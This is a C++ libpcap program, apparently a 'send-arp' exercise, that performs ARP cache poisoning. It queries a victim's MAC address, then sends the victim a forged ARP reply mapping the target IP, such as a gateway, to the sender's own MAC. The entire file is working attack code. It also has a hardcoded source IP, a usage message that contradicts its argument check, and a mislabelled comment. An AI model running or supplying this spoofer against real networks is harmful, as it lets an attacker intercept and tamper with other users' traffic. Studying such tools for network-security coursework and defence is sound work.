#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>

int get_mac_addr(char *mymac, char *interface) {
	struct ifreq ifr;

	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, interface);
	unsigned char *mac = NULL;

	int fd = socket(AF_INET, SOCK_STREAM, 0);

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
		printf("ioctl error\n");
		close(fd);
		return -1;
	}

	mac = (unsigned char*) ifr.ifr_hwaddr.sa_data;

	sprintf(mymac,"%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	
	close(fd);

	return 0;
}

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char *mymac = (char *) malloc(sizeof(char) * 18);
	get_mac_addr(mymac, dev);
	printf("%s\n", mymac);
	EthArpPacket packet;

	char* sip = argv[2];
	char* tip = argv[3];
	// broadcast
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(mymac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(mymac);
	packet.arp_.sip_ = htonl(Ip("192.168.35.89"));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(sip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	uint32_t response_sip;
	uint8_t* response_smac;
	uint32_t response_tip;
	uint8_t* response_dmac;
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		struct EthHdr *eth_hdr = (struct EthHdr *) packet; 
		
		// if EtherType is not IPv4
		if (eth_hdr->type() != eth_hdr->Arp) { 
			continue;
		}
		
		struct ArpHdr *arp_hdr = (struct ArpHdr *) (packet + 14);

		response_sip = uint32_t(arp_hdr->sip());
		response_smac = (uint8_t*)(arp_hdr->smac());

		if (response_sip != Ip(sip)) {
			continue;
		}

		response_tip = uint32_t(arp_hdr->tip());
		response_dmac = (uint8_t*)(arp_hdr->tmac());

		break;
	}

	char tmac[18];
	sprintf(tmac,"%02x:%02x:%02x:%02x:%02x:%02x", response_smac[0], response_smac[1], response_smac[2], response_smac[3], response_smac[4], response_smac[5]);
	printf("%s\n", tmac);
	printf("%s\n", mymac);
	packet.eth_.dmac_ = Mac(tmac);
	packet.eth_.smac_ = Mac(mymac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(mymac);
	packet.arp_.sip_ = htonl(Ip(tip));
	packet.arp_.tmac_ = Mac(tmac);
	packet.arp_.tip_ = htonl(Ip(sip));

	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
